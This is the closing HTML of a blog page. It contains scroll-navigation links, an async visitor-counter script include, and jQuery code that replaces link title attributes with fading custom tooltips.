<!-- End Google Analytics -->



<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>

  </div>
</body>
</html>